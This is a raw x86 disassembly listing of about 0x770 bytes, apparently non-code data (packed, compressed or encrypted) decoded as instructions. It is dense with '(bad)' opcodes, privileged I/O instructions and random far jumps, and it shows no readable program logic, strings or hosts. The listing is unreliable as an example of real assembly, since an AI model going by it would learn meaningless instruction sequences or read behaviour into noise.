  44b8ba:	sbb    DWORD PTR [ebp-0x445f24a4],0xffffff86
  44b8c1:	jp     0x44b879
  44b8c3:	mov    ah,0x2
  44b8c5:	sbb    BYTE PTR [ecx+edx*4-0x1367228b],0x3a
  44b8cd:	inc    edi
  44b8ce:	xchg   ecx,eax
  44b8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b8d0:	sti    
  44b8d1:	fwait
  44b8d2:	test   eax,0xb0991816
  44b8d7:	shl    DWORD PTR [edi+0x7535a720],cl
  44b8dd:	dec    ebx
  44b8de:	(bad)  
  44b8df:	jmp    0xf923:0x535ea519
  44b8e6:	jae    0x44b894
  44b8e8:	icebp  
  44b8e9:	jg     0x44b90b
  44b8eb:	pop    es
  44b8ec:	gs pushf 
  44b8ee:	fwait
  44b8ef:	les    ecx,FWORD PTR [ecx+esi*1-0x6b]
  44b8f3:	push   edx
  44b8f4:	push   edi
  44b8f5:	mov    bl,0xe6
  44b8f7:	sbb    ebp,edi
  44b8f9:	dec    edx
  44b8fa:	imul   ebx,esp,0x51
  44b8fd:	test   DWORD PTR [edx],esp
  44b8ff:	stc    
  44b900:	mov    ds:0x94991622,al
  44b905:	cmp    ebx,edx
  44b907:	and    esp,DWORD PTR ds:0x8cf035d1
  44b90d:	neg    BYTE PTR [edi]
  44b90f:	cmp    eax,0xaa5e4920
  44b914:	or     eax,0x442ab953
  44b919:	mov    eax,ds:0xdaa3e11b
  44b91e:	inc    sp
  44b920:	xchg   DWORD PTR [eax],eax
  44b922:	aam    0xb7
  44b924:	(bad)  
  44b925:	inc    edi
  44b926:	enter  0x4644,0x9b
  44b92a:	call   0x2cc4:0x3c29da87
  44b931:	mov    esi,0x85cd4e7e
  44b936:	mov    ebx,0x975b0714
  44b93b:	ficomp WORD PTR [ebx]
  44b93d:	sub    eax,0xefeca424
  44b942:	je     0x44b971
  44b944:	cmp    eax,0x29c3ad8a
  44b949:	pop    ebp
  44b94a:	mov    ebp,0x907c838b
  44b94f:	xlat   BYTE PTR ds:[ebx]
  44b950:	adc    esi,edi
  44b952:	fwait
  44b953:	add    eax,0xdebcf733
  44b958:	mov    bl,BYTE PTR [ecx+0x14]
  44b95b:	push   esp
  44b95c:	jecxz  0x44b94a
  44b95e:	bound  esp,QWORD PTR [edi+0x8]
  44b961:	bsr    ecx,DWORD PTR [esi+0x75]
  44b965:	lahf   
  44b966:	mov    cl,0xe6
  44b968:	and    edx,eax
  44b96a:	movups xmm6,XMMWORD PTR [ebp+0x261e8bcc]
  44b971:	mov    ?,WORD PTR [edx+0x58]
  44b974:	and    bl,BYTE PTR [edx+ebx*4+0x5bf15015]
  44b97b:	xchg   BYTE PTR [ecx+eax*2-0x11],al
  44b97f:	cmp    eax,0xf47ee355
  44b984:	sub    eax,0x93348af7
  44b989:	ret    0x24b1
  44b98c:	sar    BYTE PTR [ebx-0xb1928b2],cl
  44b992:	je     0x44b962
  44b994:	add    BYTE PTR [eax+ecx*1-0x4a52df10],ch
  44b99b:	sub    al,0x74
  44b99d:	test   eax,0x72254b6b
  44b9a2:	sub    al,0xaa
  44b9a4:	jno    0x44b941
  44b9a6:	lods   eax,DWORD PTR ds:[esi]
  44b9a7:	lds    edx,FWORD PTR [ebx]
  44b9a9:	loopne 0x44b9d6
  44b9ab:	fst    st(5)
  44b9ad:	test   DWORD PTR [edi],edx
  44b9af:	in     eax,0xd8
  44b9b1:	sub    eax,0xb918d9cf
  44b9b6:	ins    DWORD PTR es:[edi],dx
  44b9b7:	sahf   
  44b9b8:	cmp    BYTE PTR [ebx+ebp*8+0x6ba15801],dl
  44b9bf:	xchg   ecx,eax
  44b9c0:	push   ss
  44b9c1:	pushf  
  44b9c2:	xchg   ebx,eax
  44b9c3:	ss jle 0x44ba11
  44b9c6:	neg    bh
  44b9c8:	and    cl,ch
  44b9ca:	add    bl,BYTE PTR [esi+edx*4]
  44b9cd:	xchg   esp,eax
  44b9ce:	push   cs
  44b9cf:	inc    BYTE PTR ds:0x67075367
  44b9d5:	sub    BYTE PTR [ebx-0x1d],ch
  44b9d8:	ret    0x4d51
  44b9db:	cmp    BYTE PTR [ecx],dl
  44b9dd:	add    al,0xe1
  44b9df:	out    0x22,al
  44b9e1:	cdq    
  44b9e2:	xchg   esp,eax
  44b9e3:	or     dh,BYTE PTR [ecx+ebp*4+0x79687d70]
  44b9ea:	pop    esp
  44b9eb:	ins    BYTE PTR es:[edi],dx
  44b9ec:	(bad)  [esi-0x42c0ef9c]
  44b9f2:	mov    edx,0x4199192a
  44b9f7:	stos   BYTE PTR es:[edi],al
  44b9f8:	mov    edx,0x713b87aa
  44b9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b9fe:	(bad)  [ebp+0x6f]
  44ba01:	add    eax,0xda285678
  44ba06:	cdq    
  44ba07:	stc    
  44ba08:	call   0xcced05ae
  44ba0d:	mov    bl,0xcb
  44ba0f:	outs   dx,BYTE PTR ds:[esi]
  44ba10:	and    edi,edi
  44ba12:	lods   eax,DWORD PTR ds:[esi]
  44ba13:	gs mov eax,0x9a0f43a1
  44ba19:	fld    st(0)
  44ba1b:	pop    es
  44ba1c:	dec    edi
  44ba1d:	pop    ecx
  44ba1e:	in     al,dx
  44ba1f:	add    al,0xf7
  44ba21:	pop    es
  44ba22:	fsubr  QWORD PTR [esi]
  44ba24:	add    bh,0xbb
  44ba27:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  44ba29:	xor    ecx,DWORD PTR [edx+0x688a4fe8]
  44ba2f:	cmp    DWORD PTR ds:0x51b5be69,esp
  44ba35:	aaa    
  44ba36:	in     al,0x31
  44ba38:	push   ds
  44ba39:	pushf  
  44ba3a:	fwait
  44ba3b:	xchg   BYTE PTR [ebp-0x14],ch
  44ba3e:	test   eax,0xb8e7fa65
  44ba43:	sub    eax,0x44bdfb49
  44ba48:	or     DWORD PTR [eax+0x36eac635],ebp
  44ba4e:	out    0xf1,eax
  44ba50:	vcvtsi2ss xmm6,xmm3,DWORD PTR [esi+0x38]
  44ba56:	mov    ds:0xf0a77d5a,eax
  44ba5b:	push   0xffffffe3
  44ba5d:	call   0x7ef2285b
  44ba62:	mov    ecx,0x1fe02884
  44ba67:	and    dl,BYTE PTR [ebp-0x37123c46]
  44ba6d:	stos   DWORD PTR es:[edi],eax
  44ba6e:	sbb    eax,0x43491bfc
  44ba73:	mov    BYTE PTR [esi+edx*1+0x6b],dh
  44ba77:	sbb    DWORD PTR [ecx],edi
  44ba79:	mov    ds:0x14144eab,al
  44ba7e:	mov    esi,0x512ba15f
  44ba83:	mov    al,0xba
  44ba85:	pop    ecx
  44ba86:	mov    esi,0xb523f984
  44ba8b:	mov    ch,0x75
  44ba8d:	stos   DWORD PTR es:[edi],eax
  44ba8e:	sbb    edx,DWORD PTR [ebx-0x51a9392]
  44ba94:	jb     0x44ba39
  44ba96:	mov    al,BYTE PTR [edx+edx*1-0x43]
  44ba9a:	push   ecx
  44ba9b:	add    ch,dh
  44ba9d:	mov    ebp,0x65d1ee73
  44baa2:	mov    ebp,0x41eb1523
  44baa7:	out    0x59,eax
  44baa9:	or     eax,0x99234c61
  44baae:	add    ch,BYTE PTR [esi+0x7d]
  44bab1:	ss hlt 
  44bab3:	adc    BYTE PTR [edx+0x656dd767],ah
  44bab9:	les    ebp,FWORD PTR [ebx]
  44babb:	out    dx,al
  44babc:	jmp    0x44ba96
  44babe:	jb     0x44ba92
  44bac0:	in     al,dx
  44bac1:	jg     0x44ba7a
  44bac3:	xor    al,0xe5
  44bac5:	idiv   DWORD PTR [ebp-0x2f]
  44bac8:	aad    0xe8
  44baca:	adc    al,0xee
  44bacc:	sbb    DWORD PTR [edx+0x3925294a],edi
  44bad2:	and    DWORD PTR ds:0xf637be66,edi
  44bad8:	cld    
  44bad9:	fwait
  44bada:	mov    ecx,DWORD PTR [edi+0x6f34fbde]
  44bae0:	mov    eax,ds:0x2d535127
  44bae5:	mov    ?,WORD PTR [esp+edx*1-0x234df43b]
  44baec:	jbe    0x44bad7
  44baee:	fcom   QWORD PTR [eax]
  44baf0:	sbb    ebp,DWORD PTR [edi]
  44baf2:	mov    ebx,0xb293eafb
  44baf7:	shl    BYTE PTR [edi],cl
  44baf9:	sar    DWORD PTR [edx+0x2f72b804],cl
  44baff:	dec    edi
  44bb00:	(bad)  
  44bb01:	cmp    edx,ecx
  44bb03:	push   esp
  44bb04:	dec    esp
  44bb05:	adc    eax,0xea143e85
  44bb0a:	loopne 0x44baf3
  44bb0c:	mov    al,0xcc
  44bb0e:	lea    esi,[edx+0x5feccede]
  44bb14:	and    al,0x2b
  44bb16:	mov    ebp,DWORD PTR [ebx+0x45]
  44bb19:	or     DWORD PTR [ebp+ebp*1+0x5cc5753e],ebx
  44bb20:	retf   0x13a7
  44bb23:	out    0x23,eax
  44bb25:	dec    ecx
  44bb26:	xor    DWORD PTR [ecx-0x7af10b26],esp
  44bb2c:	fist   WORD PTR ds:0x8a71fc9c
  44bb32:	xchg   ecx,eax
  44bb33:	push   edx
  44bb34:	add    al,0xcb
  44bb36:	neg    ebp
  44bb38:	pop    ss
  44bb39:	push   ss
  44bb3a:	arpl   WORD PTR [ecx-0x30ca14af],di
  44bb40:	dec    edx
  44bb41:	sub    eax,0xa952e4bc
  44bb46:	test   eax,0xada7a3a3
  44bb4c:	(bad)  
  44bb4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bb4e:	pop    edi
  44bb4f:	add    DWORD PTR [ebx],esi
  44bb51:	cdq    
  44bb52:	mov    ebp,0x758cfcb5
  44bb57:	dec    eax
  44bb58:	pop    ds
  44bb59:	ss inc ecx
  44bb5b:	mov    cl,0x35
  44bb5d:	enter  0xe6e3,0xc0
  44bb61:	xchg   ecx,eax
  44bb62:	inc    esp
  44bb63:	inc    esp
  44bb64:	sbb    al,0x99
  44bb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bb67:	test   DWORD PTR [eax-0x10],edi
  44bb6a:	xchg   ecx,eax
  44bb6b:	and    eax,0x645ba54e
  44bb70:	pop    ss
  44bb71:	pop    esp
  44bb72:	jbe    0x44bb4e
  44bb74:	xchg   ebx,eax
  44bb75:	call   0xa79ca9a5
  44bb7a:	mov    al,0xb4
  44bb7c:	repnz pop eax
  44bb7e:	mov    eax,0xeb99cdca
  44bb83:	adc    al,0x99
  44bb85:	cli    
  44bb86:	push   edx
  44bb87:	sub    cl,ah
  44bb89:	pop    edi
  44bb8a:	jmp    0x9b2b:0xdea918d5
  44bb91:	jno    0x44bb94
  44bb93:	xor    edx,edx
  44bb95:	fisttp WORD PTR [ebx+0x52]
  44bb98:	ficomp WORD PTR [ecx]
  44bb9a:	(bad)  
  44bb9c:	adc    DWORD PTR [ecx+0x3c],0x7b691ef3
  44bba3:	push   ecx
  44bba4:	mov    BYTE PTR [eax+edx*4],dh
  44bba7:	cli    
  44bba8:	mov    esp,DWORD PTR [ebp+0x22c2fb7b]
  44bbae:	or     DWORD PTR [ecx+ebx*4+0x68157b7d],0x25859804
  44bbb9:	push   eax
  44bbba:	int3   
  44bbbb:	out    0x26,al
  44bbbd:	adc    eax,0x9bed892c
  44bbc2:	sub    BYTE PTR [ebx+0x168eb9ab],0xf
  44bbc9:	in     al,0x3f
  44bbcb:	(bad)  
  44bbcc:	aam    0x59
  44bbce:	in     al,dx
  44bbcf:	inc    esp
  44bbd0:	sub    al,0x9f
  44bbd2:	imul   ecx,DWORD PTR [ebx+0x13f79978],0xfffffffc
  44bbd9:	iret   
  44bbda:	hlt    
  44bbdb:	jle    0x44bb80
  44bbdd:	(bad)  
  44bbde:	jg     0x44bc36
  44bbe0:	push   esi
  44bbe1:	ss mov bh,0x94
  44bbe4:	adc    esp,DWORD PTR [ebx+edi*2+0x59cf4435]
  44bbeb:	jmp    0xa760:0x95b28050
  44bbf2:	mov    ebp,0x3f922a7a
  44bbf7:	ror    DWORD PTR [ebx+0x6b59e499],1
  44bbfd:	mov    al,ds:0xe6069476
  44bc02:	jb     0x44bbcd
  44bc04:	pop    ebp
  44bc05:	test   BYTE PTR [edx+0x68db3e94],bh
  44bc0b:	dec    edx
  44bc0c:	xlat   BYTE PTR ds:[ebx]
  44bc0d:	mov    ds:0xb52515a5,eax
  44bc12:	dec    ebx
  44bc13:	hlt    
  44bc14:	(bad)  
  44bc15:	fldenv ds:0xbab7942d
  44bc1b:	aam    0xa7
  44bc1d:	dec    esi
  44bc1e:	loope  0x44bc31
  44bc20:	adc    eax,0x27ea9d0b
  44bc25:	fidiv  WORD PTR [esi]
  44bc27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bc28:	repz loopne 0x44bc93
  44bc2b:	pop    ecx
  44bc2c:	mov    eax,0xf624b682
  44bc31:	pop    esp
  44bc32:	loope  0x44bc6e
  44bc34:	es cwde 
  44bc36:	xor    al,0x17
  44bc38:	cmc    
  44bc39:	das    
  44bc3a:	mov    ebx,esp
  44bc3c:	and    edx,DWORD PTR [esi-0x4d]
  44bc3f:	adc    BYTE PTR [ebx+0x2b],bh
  44bc42:	mov    ebp,0x2ef3ac14
  44bc47:	jnp    0x44bbd2
  44bc49:	bound  ebx,QWORD PTR [ecx]
  44bc4b:	mov    al,ds:0x8cbd0813
  44bc50:	mov    eax,ds:0x42b0a138
  44bc55:	(bad)  
  44bc56:	sahf   
  44bc57:	add    DWORD PTR es:[edx],ebp
  44bc5a:	mov    dl,0x2c
  44bc5c:	adc    DWORD PTR [ecx+0x20],esp
  44bc5f:	in     eax,dx
  44bc60:	push   ds
  44bc61:	mov    ebx,edi
  44bc63:	mov    ds:0x6536bdbb,al
  44bc68:	dec    esi
  44bc69:	sbb    DWORD PTR [ecx+0x5b080d68],edi
  44bc6f:	ins    BYTE PTR es:[edi],dx
  44bc70:	shl    BYTE PTR [edx],cl
  44bc72:	scas   al,BYTE PTR es:[edi]
  44bc73:	jo     0x44bcea
  44bc75:	mov    ebp,0xebf6f388
  44bc7a:	xchg   ecx,eax
  44bc7b:	xor    ch,BYTE PTR [ecx]
  44bc7d:	rol    BYTE PTR [ebx+0x7e],0x18
  44bc81:	sahf   
  44bc82:	mov    dh,0x3a
  44bc84:	popa   
  44bc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bc86:	mov    ebx,0x768dc4b1
  44bc8b:	xchg   ebp,eax
  44bc8c:	ss cli 
  44bc8e:	xchg   edx,eax
  44bc8f:	push   edx
  44bc90:	loop   0x44bcc3
  44bc92:	mov    bl,0x14
  44bc94:	adc    BYTE PTR [edx],cl
  44bc96:	cmp    dl,BYTE PTR [ecx+0x1f7fb156]
  44bc9c:	(bad)  
  44bc9f:	sbb    ecx,DWORD PTR [ecx-0x34]
  44bca2:	mov    bl,0x12
  44bca4:	ja     0x44bc36
  44bca6:	nop
  44bca7:	ror    DWORD PTR [edx+0x5fa4eb45],cl
  44bcad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bcae:	push   0x3ba27491
  44bcb3:	inc    edi
  44bcb4:	adc    al,0x95
  44bcb6:	mov    cl,0x43
  44bcb8:	ins    BYTE PTR es:[edi],dx
  44bcb9:	into   
  44bcba:	icebp  
  44bcbb:	cmp    bl,BYTE PTR [ebx]
  44bcbd:	stc    
  44bcbe:	mov    ch,0x12
  44bcc0:	cmp    eax,0xebeb6847
  44bcc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bcc6:	mov    ebp,DWORD PTR [edi+0x75ee2032]
  44bccc:	loopne 0x44bcb3
  44bcce:	jns    0x44bc59
  44bcd0:	mov    eax,0x4f84b791
  44bcd5:	sti    
  44bcd6:	jle    0x44bd3c
  44bcd8:	xchg   ebp,eax
  44bcd9:	lods   eax,DWORD PTR ds:[esi]
  44bcda:	dec    edi
  44bcdb:	hlt    
  44bcdc:	hlt    
  44bcdd:	(bad)  
  44bcde:	cmp    BYTE PTR [edx-0xab88fb2],ch
  44bce4:	fnstsw WORD PTR [eax]
  44bce6:	mov    al,0x74
  44bce8:	pushf  
  44bce9:	mov    dl,0xc1
  44bceb:	div    ebp
  44bced:	adc    BYTE PTR [esi-0x3],bh
  44bcf0:	adc    dl,BYTE PTR [edi-0x3e]
  44bcf3:	push   ebx
  44bcf4:	and    al,0x5c
  44bcf6:	test   eax,0x4f307def
  44bcfb:	in     eax,0x7e
  44bcfd:	xchg   edi,eax
  44bcfe:	aam    0x20
  44bd00:	scas   eax,DWORD PTR es:[edi]
  44bd01:	adc    cl,BYTE PTR [edx-0x14]
  44bd04:	cmp    DWORD PTR [esi+0x13979418],ebp
  44bd0a:	mov    esi,0x74a9c7fc
  44bd0f:	inc    eax
  44bd10:	xchg   ebx,eax
  44bd11:	jae    0x44bccd
  44bd13:	xor    al,0x68
  44bd15:	xor    bl,BYTE PTR ds:0xa998a56d
  44bd1b:	xlat   BYTE PTR ds:[ebx]
  44bd1c:	ins    DWORD PTR es:[edi],dx
  44bd1d:	mov    ch,0x5b
  44bd1f:	lahf   
  44bd20:	fstp   TBYTE PTR [ecx-0x2d]
  44bd23:	pop    edi
  44bd24:	or     cl,0xc9
  44bd27:	adc    eax,0xed00fa2d
  44bd2c:	and    edi,DWORD PTR [ecx]
  44bd2e:	pop    eax
  44bd2f:	push   esp
  44bd30:	mov    bl,0x16
  44bd32:	fdivr  st,st(6)
  44bd34:	sahf   
  44bd35:	popf   
  44bd36:	dec    ebx
  44bd37:	dec    ebx
  44bd38:	rol    DWORD PTR [esi+0x4802799],1
  44bd3e:	clc    
  44bd3f:	push   esi
  44bd40:	push   ss
  44bd41:	sbb    DWORD PTR [edx-0xc],edx
  44bd44:	push   cs
  44bd45:	(bad)  
  44bd46:	cmc    
  44bd47:	test   eax,0xe3af3ddf
  44bd4c:	sbb    ebx,DWORD PTR [ecx-0x1d9baa01]
  44bd52:	imul   ebp,esp,0x23
  44bd55:	or     eax,edi
  44bd57:	loope  0x44bd97
  44bd59:	mov    ds:0x4690550e,al
  44bd5e:	lahf   
  44bd5f:	push   es
  44bd60:	sbb    eax,0xde4e0149
  44bd65:	sub    eax,0xba0e83cb
  44bd6a:	and    esp,DWORD PTR [ebp-0x2cde7047]
  44bd70:	and    al,0x77
  44bd72:	stc    
  44bd73:	fmul   QWORD PTR [ecx]
  44bd75:	mov    cl,0xbb
  44bd77:	xor    BYTE PTR [ebp-0x6518002f],dh
  44bd7d:	push   ebx
  44bd7e:	scas   al,BYTE PTR es:[edi]
  44bd7f:	mov    DWORD PTR [ecx],esp
  44bd81:	cdq    
  44bd82:	adc    bl,BYTE PTR [edi]
  44bd84:	dec    esp
  44bd85:	icebp  
  44bd86:	pop    es
  44bd87:	cmp    al,0xf0
  44bd89:	sbb    bh,BYTE PTR [edi-0x4976b6d3]
  44bd8f:	xchg   ebp,eax
  44bd90:	clc    
  44bd91:	cmp    al,0xc5
  44bd93:	cwde   
  44bd94:	add    esp,edi
  44bd96:	mov    bh,0xac
  44bd98:	test   al,0x48
  44bd9a:	mov    ah,0xf4
  44bd9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bd9d:	jae    0x44bda5
  44bd9f:	or     dl,BYTE PTR [ebp+0x21e653ce]
  44bda5:	xchg   edi,eax
  44bda6:	lahf   
  44bda7:	arpl   WORD PTR [ecx],sp
  44bda9:	mov    DWORD PTR [esp+eiz*4-0x5],ebp
  44bdad:	outs   dx,BYTE PTR ds:[esi]
  44bdae:	adc    al,0xdf
  44bdb0:	loopne 0x44bd4e
  44bdb2:	mov    ecx,esi
  44bdb4:	mov    eax,ds:0x6fad9846
  44bdb9:	loopne 0x44bd98
  44bdbb:	and    BYTE PTR [esi+0x26],ch
  44bdbe:	mov    cl,0x54
  44bdc0:	and    bh,dl
  44bdc2:	arpl   WORD PTR [ecx-0x7a],di
  44bdc5:	(bad)  
  44bdc6:	cmovp  ebx,ebp
  44bdc9:	inc    eax
  44bdcb:	into   
  44bdcc:	out    dx,eax
  44bdcd:	inc    edx
  44bdce:	mov    eax,0x8b351614
  44bdd3:	cmp    esp,ecx
  44bdd5:	mov    eax,ds:0xbe59f38b
  44bdda:	ins    BYTE PTR es:[edi],dx
  44bddb:	fidiv  WORD PTR [bx+di+0x21b5]
  44bde0:	imul   esi,esi,0x260244b5
  44bde6:	jp     0x44bdf6
  44bde8:	test   DWORD PTR [eax+0x77],ecx
  44bdeb:	jmp    0x44be0f
  44bded:	in     al,dx
  44bdee:	int    0x18
  44bdf0:	and    BYTE PTR [edi],cl
  44bdf2:	add    eax,0xb1ded96c
  44bdf7:	data16 lahf 
  44bdf9:	mov    ds:0x554652b,eax
  44bdfe:	push   esp
  44bdff:	je     0x44be4e
  44be01:	fild   WORD PTR [esi-0x74ff5a19]
  44be07:	mov    bh,0x76
  44be09:	pop    edx
  44be0a:	jg     0x44be62
  44be0c:	cli    
  44be0d:	iret   
  44be0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44be0f:	in     eax,dx
  44be10:	and    eax,0xc706f029
  44be15:	ret    
  44be16:	(bad)  
  44be17:	fisubr DWORD PTR [edi]
  44be19:	cdq    
  44be1a:	imul   edx,DWORD PTR [ebx],0xffffffb8
  44be1d:	inc    ebx
  44be1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44be1f:	outs   dx,BYTE PTR ds:[esi]
  44be20:	pop    ecx
  44be21:	sbb    DWORD PTR [ebp+0x51],esi
  44be24:	ja     0x44bdb4
  44be26:	mov    cl,0x54
  44be28:	pop    ss
  44be29:	lods   al,BYTE PTR ds:[esi]
  44be2a:	pop    es
  44be2b:	xor    eax,0xc8c4e757
  44be30:	pop    ebp
  44be31:	jne    0x44bdbc
  44be33:	out    0xc9,al
  44be35:	(bad)  
  44be36:	ins    BYTE PTR es:[edi],dx
  44be37:	push   ecx
  44be38:	push   cs
  44be39:	jge    0x44bdee
  44be3b:	add    al,0x5a
  44be3d:	mov    ebp,0x5f05eb08
  44be42:	(bad)  
  44be43:	out    0x4e,eax
  44be45:	out    dx,al
  44be46:	into   
  44be47:	(bad)  
  44be48:	pop    esp
  44be49:	dec    ecx
  44be4a:	aad    0xf3
  44be4c:	jb     0x44be5d
  44be4e:	ds ret 
  44be50:	dec    eax
  44be51:	test   ebp,0x7ba81c5c
  44be57:	jno    0x44be5b
  44be59:	adc    BYTE PTR ds:0x331729f7,bh
  44be5f:	jmp    0xb5264c3d
  44be64:	mov    cl,0xce
  44be66:	dec    edx
  44be67:	jb     0x44bedb
  44be69:	and    eax,DWORD PTR [edx]
  44be6b:	imul   eax,ebp,0x31
  44be6e:	(bad)
  44be73:	or     ebp,DWORD PTR [ecx+ebx*8]
  44be76:	pop    ss
  44be77:	sbb    DWORD PTR [edx+0xe],esp
  44be7a:	addr16 pop edx
  44be7c:	gs in  eax,0x5
  44be7f:	sbb    eax,0x2a5207d6
  44be84:	push   ds
  44be85:	nop
  44be86:	mov    ah,BYTE PTR [esi-0x23474197]
  44be8c:	leave  
  44be8d:	sar    DWORD PTR [edi-0x33ff2871],1
  44be93:	dec    esp
  44be94:	xchg   ecx,eax
  44be95:	jo     0x44bea2
  44be97:	js     0x44becc
  44be99:	aaa    
  44be9a:	(bad)  
  44be9b:	lock mov eax,0xd9e8ab9d
  44bea1:	or     ecx,DWORD PTR [esi]
  44bea3:	bound  edx,QWORD PTR [esi+esi*8-0x5e]
  44bea7:	jno    0x44be3d
  44bea9:	test   al,0xca
  44beab:	sub    edi,ebp
  44bead:	lahf   
  44beae:	(bad)  [ebp+ebp*4-0x5a182340]
  44beb5:	jecxz  0x44bf2a
  44beb7:	ins    BYTE PTR es:[edi],dx
  44beb8:	(bad)  
  44beb9:	mov    fs,WORD PTR [esi+eiz*2]
  44bebc:	icebp  
  44bebd:	sahf   
  44bebe:	mov    ds:0xd9b96ac5,eax
  44bec3:	retf   0x3015
  44bec6:	xchg   ebp,eax
  44bec7:	cli    
  44bec8:	enter  0x7b8a,0x2b
  44becc:	dec    ecx
  44becd:	push   esi
  44bece:	arpl   bp,sp
  44bed0:	or     DWORD PTR [ebx],0x79237711
  44bed6:	test   BYTE PTR [edx],dh
  44bed8:	mov    esi,0x69467625
  44bedd:	xor    al,0x38
  44bedf:	push   0x50
  44bee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bee2:	xchg   ebx,eax
  44bee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bee4:	sahf   
  44bee5:	push   edx
  44bee6:	dec    edi
  44bee7:	add    dl,BYTE PTR [eax]
  44bee9:	sar    edx,1
  44beeb:	dec    ebx
  44beec:	pop    edx
  44beed:	sti    
  44beee:	sti    
  44beef:	xchg   edx,eax
  44bef0:	pushf  
  44bef1:	sbb    esp,DWORD PTR [ebx]
  44bef3:	cwde   
  44bef4:	push   ds
  44bef5:	sub    dh,BYTE PTR [ebx-0x151a31bc]
  44befb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44befc:	pop    edx
  44befd:	test   eax,0x60cb057
  44bf02:	es in  eax,0xae
  44bf05:	mov    cl,0xd7
  44bf07:	out    dx,al
  44bf08:	sbb    DWORD PTR [ecx-0x2f],ecx
  44bf0b:	xor    DWORD PTR [edi],edx
  44bf0d:	mov    ?,WORD PTR [edx]
  44bf0f:	pop    edi
  44bf10:	imul   ebp,DWORD PTR [edx+0x7988814b],0xffffffb3
  44bf17:	cmp    eax,0x3b8a2759
  44bf1c:	leave  
  44bf1d:	jmp    0x2832532b
  44bf22:	pushf  
  44bf23:	xchg   edi,eax
  44bf24:	and    al,0x49
  44bf26:	pop    ebp
  44bf27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bf28:	test   eax,0xf56eda8b
  44bf2d:	adc    bh,dh
  44bf2f:	or     BYTE PTR [ecx+0x923317e],ah
  44bf35:	loope  0x44bfab
  44bf37:	pop    esp
  44bf38:	pop    ecx
  44bf39:	mov    cl,0xb9
  44bf3b:	les    edi,FWORD PTR [edi+0x65f12cea]
  44bf41:	add    BYTE PTR [edi],al
  44bf43:	lock push cs
  44bf45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bf46:	out    dx,eax
  44bf47:	(bad)  
  44bf48:	and    BYTE PTR [ecx],cl
  44bf4a:	call   0x653e:0xae2225b4
  44bf51:	sbb    eax,edi
  44bf53:	fbstp  TBYTE PTR [esi]
  44bf55:	jmp    0x83ba1be6
  44bf5a:	test   eax,0x27a3bfb5
  44bf5f:	fstp   DWORD PTR [ecx+0x77]
  44bf62:	jns    0x44bf09
  44bf64:	and    cl,BYTE PTR [ecx+0x5d]
  44bf67:	les    ecx,FWORD PTR [edi+0x6b]
  44bf6a:	dec    sp
  44bf6c:	pop    eax
  44bf6d:	mov    WORD PTR [ebp-0x51],cs
  44bf70:	out    0x9f,al
  44bf72:	pop    ss
  44bf73:	xchg   ebp,eax
  44bf74:	push   ecx
  44bf75:	test   DWORD PTR [esi+0x3bc9e3ab],ebp
  44bf7b:	sbb    eax,0xc6521b11
  44bf80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bf81:	dec    ebp
  44bf82:	or     eax,0x5049f8f1
  44bf87:	or     al,0x18
  44bf89:	jmp    0x92c1a437
  44bf8e:	add    BYTE PTR [edx],dl
  44bf90:	dec    edi
  44bf91:	popf   
  44bf92:	mov    ebx,DWORD PTR [esi-0x7e9ed5b]
  44bf98:	ins    DWORD PTR es:[edi],dx
  44bf99:	inc    ebx
  44bf9a:	and    eax,0xbf731808
  44bf9f:	adc    al,0x9
  44bfa1:	jo     0x44bfeb
  44bfa3:	addr16 jne 0x44bf47
  44bfa6:	aaa    
  44bfa7:	jmp    0x44bf86
  44bfa9:	inc    edx
  44bfaa:	int    0xc2
  44bfac:	and    edi,DWORD PTR [ecx-0x62a44fea]
  44bfb2:	sar    BYTE PTR [edi+0x54eb9cfd],0x6b
  44bfb9:	adc    bh,BYTE PTR [eax-0x33216b55]
  44bfbf:	mov    eax,ds:0x14c91203
  44bfc4:	push   ecx
  44bfc5:	push   cs
  44bfc6:	es push es
  44bfc8:	and    bl,BYTE PTR [esi-0x21ecee45]
  44bfce:	inc    esi
  44bfcf:	xchg   DWORD PTR [ebp-0x64],esp
  44bfd2:	pop    ds
  44bfd3:	and    DWORD PTR [esi-0x365b3ceb],esp
  44bfd9:	(bad)  
  44bfda:	dec    ebp
  44bfdb:	cmp    ah,BYTE PTR [eax-0x67]
  44bfde:	mov    ebx,0xea9a260
  44bfe3:	sahf   
  44bfe4:	mov    bh,BYTE PTR [edi-0x1e]
  44bfe7:	stos   BYTE PTR es:[edi],al
  44bfe8:	adc    cl,BYTE PTR [esi-0xf618974]
  44bfee:	mov    dl,0x48
  44bff0:	fnstcw WORD PTR [ecx-0x35]
  44bff3:	gs push es
  44bff5:	add    BYTE PTR [edx+0x63],dl
  44bff8:	inc    esi
  44bff9:	lahf   
  44bffa:	add    dl,BYTE PTR [eax+0x59f32a75]
  44c000:	xchg   ebp,eax
  44c001:	jge    0x44bffb
  44c003:	xor    al,0x17
  44c005:	mov    cl,0x68
  44c007:	sbb    al,0x3c
  44c009:	pop    ss
  44c00a:	cld    
  44c00b:	outs   dx,BYTE PTR ds:[esi]
  44c00c:	xchg   esp,eax
  44c00d:	and    al,0xd
  44c00f:	fmul   DWORD PTR [edx-0x23315131]
  44c015:	xchg   DWORD PTR [ecx],esi
  44c017:	add    al,ch
  44c019:	call   0xf523:0xf4d873ea
  44c020:	sbb    eax,0x6d9d1be
  44c025:	pop    esp
  44c026:	scas   eax,DWORD PTR es:[edi]
  44c027:	and    eax,0xcf171a0d
  44c02c:	sbb    al,0x87
  44c02e:	gs and al,0x9
